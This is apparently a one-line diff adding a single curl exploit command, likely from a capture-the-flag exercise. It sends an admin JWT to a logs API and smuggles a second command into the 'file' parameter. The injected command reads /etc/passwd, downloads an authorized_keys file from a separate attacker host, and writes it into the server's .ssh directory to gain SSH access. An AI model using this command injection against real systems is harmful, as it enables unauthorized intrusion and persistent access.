@@ -1,0 +1,1 @@
+curl "http://10.10.11.120:3000/api/logs?file=/etc/passwd%3Bcurl%2010.10.14.14%3A8000%2Fauthorized_keys%20-o%20..%2F.ssh%2Fauthorized_keys" -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjVkNzdmOWE1NGUwMGYwNTc3NyIsIm5hbWUiOiJ0aGVhZG1pbiIsImVtYWlsIjoicm9vdEBkYXNpdGgud29ya3MiLCJpYXQiOjE2MzU5NTg2NzV9.dld0W5pudvvY2xdS2Va7o4XzgeN_Xt48rlhIYnzQXJI"
